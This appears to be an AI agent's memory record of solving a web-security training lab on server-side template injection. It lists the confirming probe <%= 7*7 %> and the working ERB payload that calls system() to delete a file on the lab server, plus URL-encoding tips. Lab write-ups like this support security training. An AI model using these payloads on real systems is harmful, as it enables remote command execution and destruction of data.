---
metadata:
  node_type: memory
name: "prs-armA-lab-ssti-basic"
description: "Arm A run record: SSTI basic lab solved via ERB system() in the message parameter"
last_updated: 2026-10-10T06:14:47+08:00
created: 2026-10-10T06:14:47+08:00
---

Path: /web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic (canonical path valid; page_read -> lab_id 401f612b786a17fa5d79a4695034393111a37b23e3c9a729cdf23878231c53e2)
Launch: range_launch launch-url <path> --jar /tmp/cj1.json -> https://0a54007e03e40e4981f5cfec00e8001c.web-security-academy.net/ (reused:false)
Surface: homepage is a plain product grid with no forms; the out-of-stock redirect target carries the injectable parameter.
Confirmed injectable: GET /?message=<%= 7*7 %> -> notification-header div renders 49 (ERB evaluated, not echoed).
Exploit: GET /?message=<%= system("rm /home/carlos/morale.txt") %> -> 200, body_len 10695.
Verdict: banner_verdict -> solved:true, solved_class:true, "Congratulations, you solved the lab!".
Notes: page_read of the lab description states the engine (ERB) and the goal file; no solution needed. URL-encode <% %> as %3C%25 %25%3E.

